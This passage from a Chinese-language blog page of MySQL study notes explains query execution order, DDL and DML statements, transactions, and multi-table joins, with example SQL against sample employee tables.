FROM ... &#x591A;&#x8868;&#x8054;&#x67E5;&#x4F1A;&#x5148; CROSS JOIN &#x6C42;&#x7B1B;&#x5361;&#x5C14;&#x79EF; =&gt; ON &#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x8FC7;&#x6EE4; =&gt; &#x5173;&#x6CE8;&#x5DE6;&#x53F3;&#x8FDE;&#x63A5; =&gt; WHERE &#x8FC7;&#x6EE4;&#x6570;&#x636E; =&gt; GROUP BY &#x6309;&#x8981;&#x6C42;&#x5206;&#x7EC4; =&gt; HAVING &#x805A;&#x5408;&#x6761;&#x4EF6;&#x7B5B;&#x9009; =&gt; SELECT =&gt; DISTINCT =&gt; ORDER BY =&gt; LIMIT
</code></pre>
<p>&#x5148;&#x6267;&#x884C; FROM &#x5173;&#x952E;&#x5B57;&#xFF0C;&#x591A;&#x8868;&#x8054;&#x67E5;&#x4F1A;&#x901A;&#x8FC7; CROSS JOIN &#x6C42;&#x7B1B;&#x5361;&#x5C14;&#x79EF;&#xFF0C;&#x5C06;&#x5F97;&#x5230;&#x7684;&#x865A;&#x62DF;&#x8868;&#x8FDB;&#x884C; ON &#x7B5B;&#x9009;&#xFF0C;&#x6B64;&#x8FC7;&#x7A0B;&#x5728; VT1-1 &#x7684;&#x57FA;&#x7840;&#x4E0A;&#x5F97;&#x5230; VT1-2&#x3002;&#x82E5;&#x4F7F;&#x7528;&#x5230;&#x5DE6;&#x3001;&#x53F3;&#x8FDE;&#x63A5;&#x6216;&#x8005;&#x5168;&#x8FDE;&#x63A5;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x5728; VT1-2 &#x7684;&#x57FA;&#x7840;&#x4E0A;&#x589E;&#x52A0;&#x5916;&#x90E8;&#x884C;&#x4EA7;&#x751F; VT1-3&#x3002;</p>
<p>&#x901A;&#x8FC7; VT1 &#x83B7;&#x53D6;&#x539F;&#x59CB;&#x6570;&#x636E;&#x540E;&#x8FDB;&#x884C; WHERE &#x64CD;&#x4F5C;&#xFF0C;&#x6839;&#x636E;&#x7ED3;&#x679C;&#x7B5B;&#x9009;&#x8FC7;&#x6EE4;&#x5F97;&#x5230; VT2&#x3002;</p>
<p>GROUP BY &#x548C; HAVING &#x5BF9; VT2 &#x8FDB;&#x884C;&#x5206;&#x7EC4;&#x548C;&#x8FC7;&#x6EE4;&#x5F97;&#x5230; VT3 &#x548C; VT4&#x3002;</p>
<p>SELECT &#x548C; DISTINCT &#x63D0;&#x53D6;&#x6240;&#x9700;&#x5B57;&#x6BB5;&#x5E76;&#x8FC7;&#x6EE4;&#x6389;&#x91CD;&#x590D;&#x7684;&#x884C;&#x5F97;&#x5230; VT5-1 &#x548C; VT5-2&#x3002;</p>
<p>ORDER BY &#x548C; LIMIT &#x5BF9;&#x6307;&#x5B9A;&#x7684;&#x5B57;&#x6BB5;&#x6392;&#x5E8F;&#x5E76;&#x901A;&#x8FC7;&#x5206;&#x9875;&#x53D6;&#x51FA;&#x6307;&#x5B9A;&#x884C;&#xFF0C;&#x5F97;&#x5230;&#x6700;&#x7EC8;&#x7684; VT6 &#x4E0E; VT7&#x3002;</p>
<h3 id="%E5%88%9B%E5%BB%BA%E5%92%8C%E7%AE%A1%E7%90%86%E6%95%B0%E6%8D%AE%E5%BA%93">&#x521B;&#x5EFA;&#x548C;&#x7BA1;&#x7406;&#x6570;&#x636E;&#x5E93;</h3>
<pre><code class="language-javascript">/* &#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93; */
CREATE DATABASE &#x6570;&#x636E;&#x5E93;&#x540D;; // &#x5B57;&#x7B26;&#x96C6;&#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93;&#x9ED8;&#x8BA4;
CREATE DATABASE &#x6570;&#x636E;&#x5E93;&#x540D; CHARACTER SET &apos;&#x5B57;&#x7B26;&#x96C6;&apos;; // &#x663E;&#x793A;&#x6307;&#x660E;&#x5B57;&#x7B26;&#x96C6;
CREATE DATABASE IF NOT EXISTS &#x6570;&#x636E;&#x5E93;&#x540D; CHARACTER SET &apos;&#x5B57;&#x7B26;&#x96C6;&apos;; // &#x8981;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x5B58;&#x5728;&#x5219;&#x4E0D;&#x6210;&#x529F;&#x4E0D;&#x62A5;&#x9519;
/* &#x4F7F;&#x7528;&#x6570;&#x636E;&#x5E93; */
// &#x67E5;&#x770B;&#x5F53;&#x524D;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x5E93;
SHOW DATABASES; // S&#x4EE3;&#x8868;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;
// &#x67E5;&#x770B;&#x5F53;&#x524D;&#x6B63;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;
SELECT DATABASE();  #&#x4F7F;&#x7528;&#x7684;&#x4E00;&#x4E2A; mysql &#x4E2D;&#x7684;&#x5168;&#x5C40;&#x51FD;&#x6570;
// &#x67E5;&#x770B;&#x6307;&#x5B9A;&#x5E93;&#x4E0B;&#x6240;&#x6709;&#x7684;&#x8868;
SHOW TABLES FROM &#x6570;&#x636E;&#x5E93;&#x540D;;
// &#x67E5;&#x770B;&#x6570;&#x636E;&#x5E93;&#x7684;&#x521B;&#x5EFA;&#x4FE1;&#x606F;
SHOW CREATE DATABASE &#x6570;&#x636E;&#x5E93;&#x540D;;
SHOW CREATE DATABASE &#x6570;&#x636E;&#x5E93;&#x540D;\G // &#x683C;&#x5F0F;&#x5316;&#x8F93;&#x51FA;&#x4FE1;&#x606F;
// &#x4F7F;&#x7528;/&#x5207;&#x6362;&#x6570;&#x636E;&#x5E93;
USE &#x6570;&#x636E;&#x5E93;&#x540D;;
/* &#x4FEE;&#x6539;&#x6570;&#x636E;&#x5E93; */
// &#x66F4;&#x6539;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;
ALTER DATABASE &#x6570;&#x636E;&#x5E93;&#x540D; CHARACTER SET &#x5B57;&#x7B26;&#x96C6;; // &#x6BD4;&#x5982;gbk&#x3001;utf8&#x7B49;
/* &#x5220;&#x9664;&#x6570;&#x636E;&#x5E93; */
DROP DATABASE &#x6570;&#x636E;&#x5E93;&#x540D;;
DROP DATABASE IF EXISTS &#x6570;&#x636E;&#x5E93;&#x540D;; // &#x63A8;&#x8350;
/* 
&#x521B;&#x5EFA;&#x8868;
&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x8868;&#x540D;&#x3001;&#x5217;&#x540D;(&#x6216;&#x5B57;&#x6BB5;&#x540D;)&#x3001;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x3001;&#x957F;&#x5EA6;;&#x53EF;&#x9009;&#x6307;&#x5B9A;&#x7EA6;&#x675F;&#x6761;&#x4EF6;&#x3001;&#x9ED8;&#x8BA4;&#x503C;
&#x6570;&#x636E;&#x7C7B;&#x578B;&#x63CF;&#x8FF0;
INT =&gt; &#x4ECE;-231&#x5230;231-1&#x7684;&#x6574;&#x578B;&#x6570;&#x636E;;&#x5B58;&#x50A8;&#x5927;&#x5C0F;&#x4E3A;4&#x4E2A;&#x5B57;&#x8282;
CHAR(size) =&gt; &#x5B9A;&#x957F;&#x5B57;&#x7B26;&#x6570;&#x636E;;&#x82E5;&#x672A;&#x6307;&#x5B9A;&#x9ED8;&#x8BA4;&#x4E3A;1&#x4E2A;&#x5B57;&#x7B26;,&#x6700;&#x5927;&#x957F;&#x5EA6;255
VARCHAR(size) =&gt; &#x53EF;&#x53D8;&#x957F;&#x5B57;&#x7B26;&#x6570;&#x636E;,&#x6839;&#x636E;&#x5B57;&#x7B26;&#x4E32;&#x5B9E;&#x9645;&#x957F;&#x5EA6;&#x4FDD;&#x5B58;,&#x5FC5;&#x987B;&#x6307;&#x5B9A;&#x957F;&#x5EA6;
FLOAT(M,D) =&gt; &#x5355;&#x7CBE;&#x5EA6;&#xFF0C;&#x5360;&#x7528;4&#x4E2A;&#x5B57;&#x8282;&#xFF0C;M=&#x6574;&#x6570;&#x4F4D;+&#x5C0F;&#x6570;&#x4F4D;&#xFF0C;D=&#x5C0F;&#x6570;&#x4F4D;&#x3002; D&lt;=M&lt;=255,0&lt;=D&lt;=30&#xFF0C;&#x9ED8;&#x8BA4;M+D&lt;=6
DOUBLE(M,D) =&gt; &#x53CC;&#x7CBE;&#x5EA6;&#x5360;&#x7528;8&#x4E2A;&#x5B57;&#x8282;;D&lt;=M&lt;=255,0&lt;=D&lt;=30,&#x9ED8;&#x8BA4;M+D&lt;=15
DECIMAL(M,D) =&gt; &#x9AD8;&#x7CBE;&#x5EA6;&#x5C0F;&#x6570;&#x5360;&#x7528;M+2&#x4E2A;&#x5B57;&#x8282;;D&lt;=M&lt;=65,0&lt;=D&lt;=30,&#x6700;&#x5927;&#x53D6;&#x503C;&#x8303;&#x56F4;&#x4E0E;DOUBLE&#x76F8;&#x540C;
DATE =&gt; &#x65E5;&#x671F;&#x578B;&#x6570;&#x636E;,&#x683C;&#x5F0F; &apos;YYYY-MM-DD&apos;
BLOB =&gt; &#x4E8C;&#x8FDB;&#x5236;&#x5F62;&#x5F0F;&#x7684;&#x957F;&#x6587;&#x672C;&#x6570;&#x636E;,&#x6700;&#x5927;&#x53EF;&#x8FBE;4G
TEXT =&gt; &#x957F;&#x6587;&#x672C;&#x6570;&#x636E;,&#x6700;&#x5927;&#x53EF;&#x8FBE;4G
*/
CREATE TABLE [IF NOT EXISTS] &#x8868;&#x540D;(
	&#x5B57;&#x6BB5;1, &#x6570;&#x636E;&#x7C7B;&#x578B; [&#x7EA6;&#x675F;&#x6761;&#x4EF6;] [&#x9ED8;&#x8BA4;&#x503C;],
	&#x5B57;&#x6BB5;2, &#x6570;&#x636E;&#x7C7B;&#x578B; [&#x7EA6;&#x675F;&#x6761;&#x4EF6;] [&#x9ED8;&#x8BA4;&#x503C;],
	&#x2026;&#x2026;
	[&#x8868;&#x7EA6;&#x675F;&#x6761;&#x4EF6;]
);
// MySQL&#x5728;&#x6267;&#x884C;&#x5EFA;&#x8868;&#x8BED;&#x53E5;&#x65F6;,&#x5C06;id&#x5B57;&#x6BB5;&#x7684;&#x7C7B;&#x578B;&#x8BBE;&#x7F6E;&#x4E3A;int(11),&#x8FD9;&#x91CC;&#x7684;11&#x5B9E;&#x9645;&#x4E0A;&#x662F;int&#x7C7B;&#x578B;&#x6307;&#x5B9A;&#x7684;&#x663E;&#x793A;&#x5BBD;&#x5EA6;,&#x9ED8;&#x8BA4;&#x7684;&#x663E;&#x793A;&#x5BBD;&#x5EA6;&#x4E3A;11.&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x8868;&#x7684;&#x65F6;&#x5019;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x7684;&#x663E;&#x793A;&#x5BBD;&#x5EA6;.
CREATE TABLE IF NOT EXISTS myempl(id INT,emp_name VARCHAR(15),hire_date DATE);
// &#x67E5;&#x770B;&#x8868;&#x7ED3;&#x6784; =&gt; &#x521B;&#x5EFA;&#x8868;&#x672A;&#x6307;&#x660E;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x96C6;,&#x5219;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&#x8868;&#x6240;&#x5728;&#x7684;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;
DESC myempl;
SHOW CREATE TABLE myempl;
// &#x57FA;&#x4E8E;&#x73B0;&#x6709;&#x7684;&#x8868;&#x521B;&#x5EFA;&#x8868; =&gt; &#x5B57;&#x6BB5;&#x522B;&#x540D;&#x5C06;&#x4F5C;&#x4E3A;&#x65B0;&#x8868;&#x5B57;&#x6BB5;&#x540D;
CREATE TABLE &#x65B0;&#x8868;&#x540D; AS SELECT &#x5B57;&#x6BB5;&#x4E00; &#x5B57;&#x6BB5;&#x4E00;&#x522B;&#x540D;,&#x5B57;&#x6BB5;&#x4E8C;,... FROM &#x5176;&#x4ED6;&#x8868;;
// &#x521B;&#x5EFA;&#x65B0;&#x8868;employees_copy&#x5B9E;&#x73B0;&#x5BF9;employees&#x8868;&#x590D;&#x5236;,&#x5305;&#x542B;&#x8868;&#x6570;&#x636E;
CREATE TABLE employees_copy AS SELECT * FROM employees;
// &#x521B;&#x5EFA;&#x65B0;&#x8868;employees_copy&#x5B9E;&#x73B0;&#x5BF9;employees&#x8868;&#x590D;&#x5236;,&#x4E0D;&#x5305;&#x542B;&#x8868;&#x6570;&#x636E; =&gt; &#x7ED9;&#x4E00;&#x4E2A;&#x4E0D;&#x53EF;&#x5B8C;&#x6210;&#x7684;&#x6761;&#x4EF6;
CREATE TABLE employees_copy AS SELECT * FROM employees WHERE department_id &gt; 10000;
CREATE TABLE employees_copy AS SELECT * FROM employees WHERE 1=2;
/* &#x4FEE;&#x6539;&#x8868; */
// &#x6DFB;&#x52A0;&#x5B57;&#x6BB5;
ALTER TABLE &#x8868;&#x540D; ADD &#x5B57;&#x6BB5;&#x540D; &#x5B57;&#x6BB5;&#x7C7B;&#x578B; [FIRST|AFTER &#x5B57;&#x6BB5;&#x540D;];
ALTER TABLE myempl ADD salary DOUBLE(10,2); // &#x9ED8;&#x8BA4;&#x6DFB;&#x52A0;&#x8868;&#x4E2D;&#x6700;&#x540E;&#x5B57;&#x6BB5;&#x4F4D;&#x7F6E;
ALTER TABLE myempl ADD email VARCHAR(45) AFTER emp_name;
// &#x4FEE;&#x6539;&#x5B57;&#x6BB5; =&gt; &#x901A;&#x5E38;&#x4E0D;&#x6539;&#x6570;&#x636E;&#x7C7B;&#x578B;
ALTER TABLE myempl MODIFY emp_name VARCHAR(25) DEFAULT &apos;&#x9ED8;&#x8BA4;&#x503C;&apos;;
// &#x91CD;&#x547D;&#x540D;&#x5B57;&#x6BB5; =&gt; &#x53EF;&#x4EE5;&#x66F4;&#x6539;&#x6570;&#x636E;&#x957F;&#x5EA6; =&gt; &#x5B58;&#x5728;MODIFY&#x884C;&#x4E3A;
ALTER TABLE myempl CHANGE salary monthly_salary DOUBLE(10,2);
// &#x5220;&#x9664;&#x5B57;&#x6BB5;
ALTER TABLE myempl DROP COLUMN my_email;
/* &#x91CD;&#x547D;&#x540D;&#x8868; */
RENAME TABLE myempl TO zssempl;
ALTER TABLE zssempl RENAME TO myempl;
/*
&#x5220;&#x9664;&#x8868; =&gt; &#x8868;&#x7ED3;&#x6784;&#x4E0E;&#x6570;&#x636E;&#x90FD;&#x5220;&#x9664;,&#x91CA;&#x653E;&#x7A7A;&#x95F4;
DROP TABLE [IF EXISTS] &#x6570;&#x636E;&#x8868;1 [, &#x6570;&#x636E;&#x8868;2, &#x2026;, &#x6570;&#x636E;&#x8868;n];
*/
DROP TABLE IF EXISTS myempl;
/*
&#x6E05;&#x7A7A;&#x8868; =&gt; &#x6E05;&#x7A7A;&#x6240;&#x6709;&#x6570;&#x636E;,&#x8868;&#x7ED3;&#x6784;&#x4FDD;&#x7559;
*/
TRUNCATE TABLE [&#x8868;&#x540D;]
</code></pre>
<p>&#x6267;&#x884C; COMMIT &#x63D0;&#x4EA4;&#x6570;&#x636E;&#xFF0C;&#x6570;&#x636E;&#x5C31;&#x88AB;&#x6C38;&#x4E45;&#x7684;&#x4FDD;&#x5B58;&#x5728;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x4E0D;&#x53EF;&#x4EE5;&#x56DE;&#x6EDA;&#xFF0C;&#x589E;&#x5220;&#x6539;&#x9700;&#x8981;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x3002;&#x6267;&#x884C; ROLLBACK &#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x6570;&#x636E;&#x7684;&#x56DE;&#x6EDA;&#xFF0C;&#x56DE;&#x6EDA;&#x5230;&#x6700;&#x8FD1;&#x4E00;&#x6B21; COMMIT &#x4E4B;&#x540E;&#x3002;TRUNCATE &#x8BED;&#x53E5;&#x4E0D;&#x80FD;&#x56DE;&#x6EDA;&#xFF0C;&#x800C;&#x4F7F;&#x7528; DELETE &#x8BED;&#x53E5;&#x5220;&#x9664;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x56DE;&#x6EDA;&#x3002;</p>
<p>DDL &#x7684;&#x64CD;&#x4F5C;&#x4E00;&#x65E6;&#x6267;&#x884C;&#x5C31;&#x4E0D;&#x53EF;&#x56DE;&#x6EDA;&#xFF0C;&#x6307;&#x4EE4; <code>SET autocommit = FALSE</code> &#x5BF9;&#x5176;&#x5931;&#x6548;&#x3002;&#x56E0;&#x5728;&#x6267;&#x884C;&#x5B8C; DDL &#x64CD;&#x4F5C;&#x540E;&#xFF0C;&#x4F1A;&#x518D;&#x6B21;&#x6267;&#x884C; COMMIT&#x3002;&#x6B64;&#x65F6; COMMIT &#x64CD;&#x4F5C;&#x4E0D;&#x53D7; <code>SET autocommit = FALSE</code> &#x7684;&#x5F71;&#x54CD;&#x3002;DML &#x64CD;&#x4F5C;&#x540C;&#x6837;&#x9ED8;&#x8BA4;&#x4E3A;&#x6267;&#x884C;&#x540E;&#x4E0D;&#x53EF;&#x56DE;&#x6EDA;&#x3002;&#x4F46;&#x5982;&#x679C;&#x5728;&#x6267;&#x884C; DML &#x4E4B;&#x524D;&#xFF0C;&#x6267;&#x884C; <code>SET autocommit = FALSE</code>&#xFF0C;&#x5219;&#x6267;&#x884C;&#x7684; DML &#x64CD;&#x4F5C;&#x5C31;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x56DE;&#x6EDA;&#x3002;</p>
<p>&#x636E;&#x963F;&#x91CC;&#x5F00;&#x53D1;&#x89C4;&#x8303;&#xFF0C;TRUNCATE &#x6BD4; DELETE &#x901F;&#x5EA6;&#x5FEB;&#xFF0C;&#x4E14;&#x4F7F;&#x7528;&#x7684;&#x7CFB;&#x7EDF;&#x548C;&#x4E8B;&#x52A1;&#x65E5;&#x5FD7;&#x8D44;&#x6E90;&#x5C11;&#xFF0C;&#x4F46; TRUNCATE &#x65E0;&#x4E8B;&#x52A1;&#x4E14;&#x4E0D;&#x89E6;&#x53D1; TRIGGER&#xFF0C;&#x6709;&#x53EF;&#x80FD;&#x9020;&#x6210;&#x4E8B;&#x6545;&#xFF0C;&#x6545;&#x4E0D;&#x5EFA;&#x8BAE;&#x5728;&#x5F00;&#x53D1;&#x4EE3;&#x7801;&#x4E2D;&#x4F7F;&#x7528;&#x6B64;&#x8BED;&#x53E5;&#x3002;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#xFF0C;TRUNCATE TABLE &#x5728;&#x529F;&#x80FD;&#x4E0A;&#x4E0E;&#x4E0D;&#x5E26; WHERE &#x5B50;&#x53E5;&#x7684; DELETE &#x8BED;&#x53E5;&#x76F8;&#x540C;&#x3002;</p>
<h3 id="dml-%E5%A2%9E%E5%88%A0%E6%94%B9">DML &#x589E;&#x5220;&#x6539;</h3>
<pre><code class="language-javascript">/* &#x6DFB;&#x52A0;&#x6570;&#x636E; */
// &#x524D;&#x7F6E;&#x64CD;&#x4F5C;
CREATE TABLE IF NOT EXISTS empl(id INT,last_name VARCHAR(15),hire_date DATE,salary DOUBLE(10,2));
// &#x4E00;&#x6761;&#x6DFB;&#x52A0;
INSERT INTO empl VALUES(1,&apos;gz&apos;,&apos;2000-12-21&apos;,10000); // &#x4E25;&#x683C;&#x6309;&#x7167;&#x58F0;&#x660E;&#x5B57;&#x6BB5;&#x5148;&#x540E;&#x6DFB;&#x52A0;
INSERT INTO empl (id,hire_date,salary,last_name) VALUES (2,&apos;2001-01-01&apos;,9000,&apos;hz&apos;);
INSERT INTO empl (id,salary,last_name) VALUES (3,8000,&apos;jr&apos;);
// &#x540C;&#x65F6;&#x63D2;&#x5165;&#x591A;&#x6761;&#x8BB0;&#x5F55; =&gt; &#x5177;&#x4F53;&#x7EC4;&#x503C;&#x7528;&#x9017;&#x53F7;&#x5206;&#x5272;
INSERT INTO empl (id,salary,last_name,hire_date) VALUES (4,8000,&apos;jt&apos;,&apos;2001-02-03&apos;),(5,7000,&apos;bz&apos;,&apos;2001-03-04&apos;);
// &#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x63D2;&#x5165;&#x8868;
INSERT INTO [TABLE_NAME] (&#x5B57;&#x6BB5;1,&#x5B57;&#x6BB5;2,...) SELECT &#x5BF9;&#x5E94;&#x5B57;&#x6BB5;1,&#x5BF9;&#x5E94;&#x5B57;&#x6BB5;2,... FROM [TABLE_NAME_other] WHERE ...;
/* &#x66F4;&#x65B0;&#x6570;&#x636E; */
// UPDATE ... SET ... WHERE =&gt; &#x65E0; WHERE &#x5373;&#x6279;&#x91CF;&#x4FEE;&#x6539;
UPDATE empl SET hire_date = CURDATE() WHERE id = 5;
// &#x4FEE;&#x6539;&#x4E00;&#x6761;&#x6570;&#x636E;&#x7684;&#x591A;&#x4E2A;&#x5B57;&#x6BB5;
UPDATE empl SET hire_date = CURDATE(),salary = 8888 WHERE id = 5;
/* &#x5220;&#x9664;&#x6570;&#x636E; */
DELETE FROM empl WHERE id = 1;
/* mysql8 &#x65B0;&#x7279;&#x6027; =&gt; &#x8BA1;&#x7B97;&#x5217; */
// c &#x4E3A;&#x8BA1;&#x7B97;&#x5217;
CREATE TABLE test1(a INT,b INT,c INT GENERATED ALWAYS AS (a+b) VIRTUAL);
INSERT INTO test1 (a,b) VALUES (10,20);
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E5%A4%9A%E8%A1%A8%E6%9F%A5%E8%AF%A2">&#x591A;&#x8868;&#x67E5;&#x8BE2;</h2>
<p>&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x7684;&#x610F;&#x4E49;&#x5728;&#x4E8E;&#xFF0C;&#x51CF;&#x5C11;&#x7F51;&#x7EDC;&#x8FDC;&#x7A0B;&#x7684;&#x4EA4;&#x4E92;&#x6B21;&#x6570;&#x3002;&#x82E5;&#x9700;&#x591A;&#x6B21;&#x6839;&#x636E;&#x4E0D;&#x540C;&#x8868;&#x8FD4;&#x56DE;&#x5185;&#x5BB9;&#x624D;&#x80FD;&#x786E;&#x5B9A;&#x6570;&#x636E;&#xFF0C;&#x90A3;&#x4E48;&#x4F1A;&#x5B58;&#x5728;&#x8F83;&#x5927;&#x6027;&#x80FD;&#x635F;&#x8017;&#x3002;&#x901A;&#x8FC7;&#x5355;&#x6761;&#x8BED;&#x53E5;&#x5B8C;&#x6210;&#x9700;&#x8981;&#x591A;&#x4E2A;&#x7B80;&#x5355; SQL &#x8BED;&#x53E5;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x7684;&#x76EE;&#x7684;&#x3002;</p>
<p><img src="yourdomain.com/content/images/2022/04/----.png" alt="MySQL &#x7B14;&#x8BB0;" loading="lazy"></p>
<p>&#x8FDB;&#x884C;&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x65F6;&#x51FA;&#x73B0;&#x7B1B;&#x5361;&#x5C14;&#x4E58;&#x79EF;&#x7684;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#x53EF;&#x80FD;&#x5728;&#x4E8E;&#x5173;&#x8054;&#x6761;&#x4EF6;&#x5931;&#x6548;&#x3001;&#x7701;&#x7565;&#x591A;&#x4E2A;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;&#x4EE5;&#x53CA;&#x6240;&#x6709;&#x8868;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x884C;&#x4E92;&#x76F8;&#x8FDE;&#x63A5;&#x3002;&#x8868;&#x4E2D;&#x6570;&#x636E;&#x4E0E;&#x5176;&#x4ED6;&#x8868;&#x4E2D;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x4E86;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x7684;&#x7EC4;&#x5408;&#x3002;&#x7EC4;&#x5408;&#x4E2A;&#x6570;&#x5373;&#x4E3A;&#x8868;&#x4E2D;&#x5143;&#x7D20;&#x4E2A;&#x6570;&#x7684;&#x4E58;&#x79EF;&#x3002;</p>
<pre><code class="language-javascript"># &#x7B1B;&#x5361;&#x5C14;&#x4E58;&#x79EF;&#x7684;&#x9519;&#x8BEF; =&gt; &#x672A;&#x9650;&#x5236;&#x8868;&#x7684;&#x8FDE;&#x63A5;&#x6761;&#x4EF6; =&gt; &#x4E09;&#x79CD;&#x9519;&#x8BEF;&#x5F62;&#x5F0F;
SELECT employee_id,department_name FROM employees,departments;
SELECT * FROM employees,departments;
SELECT employee_id,department_name FROM employees CROSS JOIN departments;
</code></pre>
<pre><code class="language-javascript"># &#x589E;&#x52A0;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;
SELECT employee_id,department_name FROM employees,departments WHERE employees.department_id = departments.department_id;
# &#x5982;&#x679C;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x51FA;&#x73B0;&#x591A;&#x4E2A;&#x8868;&#x90FD;&#x5B58;&#x5728;&#x7684;&#x5B57;&#x6BB5;&#x5219;&#x5FC5;&#x987B;&#x6307;&#x660E;&#x6B64;&#x5B57;&#x6BB5;&#x6240;&#x5728;&#x7684;&#x8868;
# &#x5426;&#x5219;&#x51FA;&#x73B0;ERROR 1052 (23000): Column &apos;department_id&apos; in field list is ambiguous
SELECT employee_id,department_name,employees.department_id FROM employees,departments WHERE employees.department_id = departments.department_id;
# &#x4ECE;sql&#x4F18;&#x5316;&#x89D2;&#x5EA6;&#x5EFA;&#x8BAE;&#x591A;&#x8868;&#x67E5;&#x8BE2;&#x6BCF;&#x4E2A;&#x5B57;&#x6BB5;&#x524D;&#x6307;&#x660E;&#x5176;&#x6240;&#x5728;&#x7684;&#x4F4D;&#x7F6E;
# FROM &#x4F7F;&#x7528;&#x522B;&#x540D;&#x4E5F;&#x53EF;&#x4EE5;&#x5728; SELECT &#x4F7F;&#x7528; =&gt; &#x6CE8;&#x610F;&#x8D77;&#x4E86;&#x522B;&#x540D;&#x5C31;&#x5FC5;&#x987B;&#x7528;&#x522B;&#x540D;,&#x4E0D;&#x80FD;&#x518D;&#x7528;&#x539F;&#x540D;
SELECT emp.employee_id,dept.department_name,emp.department_id FROM employees emp,departments dept WHERE emp.department_id = dept.department_id;
# &#x82E5;&#x6709;n&#x5F20;&#x8868;&#x5219;&#x9700;&#x8981;&#x6709;n-1&#x4E2A;&#x8FDE;&#x63A5;&#x6761;&#x4EF6;
SELECT emp.employee_id,emp.last_name,dept.department_name,emp.department_id,loc.city,loc.location_id FROM employees emp,departments dept,locations loc WHERE emp.department_id = dept.department_id AND dept.location_id = loc.location_id;
</code></pre>
<h3 id="%E7%AD%89%E5%80%BC%E8%BF%9E%E6%8E%A5%E4%B8%8E%E9%9D%9E%E7%AD%89%E5%80%BC%E8%BF%9E%E6%8E%A5">&#x7B49;&#x503C;&#x8FDE;&#x63A5;&#x4E0E;&#x975E;&#x7B49;&#x503C;&#x8FDE;&#x63A5;</h3>
<p>&#x67E5;&#x8BE2;&#x8BF7;&#x6C42;&#x6D89;&#x53CA;&#x5230;&#x591A;&#x4E2A;&#x8868;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8FDE;&#x63A5;&#x4E24;&#x4E2A;&#x8868;&#x7684;&#x6761;&#x4EF6;&#x4E3A;&#x76F8;&#x7B49;&#x65F6;&#xFF0C;&#x5C31;&#x662F;&#x7B49;&#x503C;&#x8FDE;&#x63A5;&#x67E5;&#x8BE2;&#xFF1B;&#x5176;&#x4ED6;&#x7684;&#x8FD0;&#x7B97;&#x7B26;&#x8FDE;&#x63A5;&#x7684;&#x5C31;&#x662F;&#x975E;&#x7B49;&#x503C;&#x67E5;&#x8BE2;&#x3002;</p>
<pre><code class="language-javascript">SELECT * FROM job_grades;
SELECT e.last_name,e.salary,j.grade_level FROM employees e, job_grades j WHERE e.salary &gt;= j.lowest_sal AND e.salary &lt;= j.highest_sal;
</code></pre>
<h3 id="%E8%87%AA%E8%BF%9E%E6%8E%A5%E4%B8%8E%E9%9D%9E%E8%87%AA%E8%BF%9E%E6%8E%A5">&#x81EA;&#x8FDE;&#x63A5;&#x4E0E;&#x975E;&#x81EA;&#x8FDE;&#x63A5;</h3>
<p>&#x975E;&#x81EA;&#x8FDE;&#x63A5;&#x5373;&#x4E0D;&#x540C;&#x7684;&#x8868;&#x4E4B;&#x95F4;&#x5B9E;&#x73B0;&#x8FDE;&#x63A5;&#x64CD;&#x4F5C;&#xFF1B;&#x82E5;&#x662F;&#x8868;&#x81EA;&#x884C;&#x4E0E;&#x81EA;&#x5DF1;&#x8FDE;&#x63A5;&#xFF0C;&#x5219;&#x79F0;&#x4E3A;&#x81EA;&#x8FDE;&#x63A5;&#x3002;</p>
<pre><code class="language-javascript"># &#x67E5;&#x8BE2;&#x5458;&#x5DE5;id&#x3001;&#x59D3;&#x540D;&#x4EE5;&#x53CA;&#x7BA1;&#x7406;&#x8005;&#x7684;id&#x3001;&#x59D3;&#x540D;
SELECT emp.employee_id,emp.last_name,mgr.employee_id,mgr.last_name FROM employees emp, employees mgr WHERE emp.manager_id = mgr.employee_id;
</code></pre>
<h3 id="%E5%86%85%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%A4%96%E8%BF%9E%E6%8E%A5">&#x5185;&#x8FDE;&#x63A5;&#x548C;&#x5916;&#x8FDE;&#x63A5;</h3>
